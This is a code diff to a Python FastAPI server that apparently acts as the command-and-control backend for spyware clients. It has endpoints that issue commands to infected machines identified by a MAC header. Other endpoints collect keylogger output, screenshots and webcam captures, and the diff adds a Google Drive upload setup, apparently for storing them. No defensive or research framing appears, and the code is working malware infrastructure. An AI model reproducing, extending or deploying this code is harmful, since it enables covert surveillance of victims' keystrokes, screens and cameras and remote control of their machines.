@@ -2,24 +2,26 @@ __author__ = 'Tomer Gibor'
 
 import os
 from typing import Dict, List, Union
-from http import HTTPStatus
 
 import uvicorn
-from fastapi import FastAPI, Request, Form, Depends, HTTPException
+from fastapi import FastAPI, Request, Form, Depends, HTTPException, status
 from fastapi.responses import HTMLResponse
 from fastapi.security import HTTPBasicCredentials
 
 from security import verify_credentials
 from db_utils import DBHandler
-from handle_clients import handle_command_request, handle_first_command, upload_file
+from handle_clients import handle_command_request, handle_first_command, upload_file, update_datetime
 from consts import DBIdentifiers, HTTPHeaders
+from driveapi import setup_driveapi
 
 app = FastAPI()
 db_handler = DBHandler()
+setup_driveapi()
 
 
 @app.get('/')
-async def root(credentials: HTTPBasicCredentials = Depends(verify_credentials)) -> HTMLResponse:
+async def root(credentials: HTTPBasicCredentials
+               = Depends(verify_credentials)) -> HTMLResponse:
     with open('source_files/index.html', 'r') as file:
         return HTMLResponse(file.read())
 
@@ -60,28 +62,32 @@ async def add_commands(credentials: HTTPBasicCredentials = Depends(verify_creden
 @app.get('/first_command')
 async def first_command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
-        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
+        return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    # doesn't update datetime since the client is possibly yet to be created.
     return handle_first_command(request)
 
 
 @app.get('/command')
 async def command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
-        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
+        return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    update_datetime(request)
     return handle_command_request(request)
 
 
 @app.post('/keylog_data')
 async def keylog(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
-        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
+        return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    update_datetime(request)
     await upload_file(request, 'log', DBIdentifiers.KEYLOG, 'txt', True)
 
 
 @app.post('/screenshot')
 async def screenshot(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
-        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
+        return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    update_datetime(request)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT, file_type)
@@ -90,7 +96,8 @@ async def screenshot(request: Request) -> Union[None, HTTPException]:
 @app.post('/webcam_capture')
 async def webcam_capture(request: Request) -> Union[None, HTTPException]:
     if HTTPHeaders.MAC not in request.headers:
-        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
+        return HTTPException(status_code=status.HTTP_404_NOT_FOUND)
+    update_datetime(request)
     # retrieve image file type
     file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
     await upload_file(request, 'webcam', DBIdentifiers.WEBCAM, file_type)
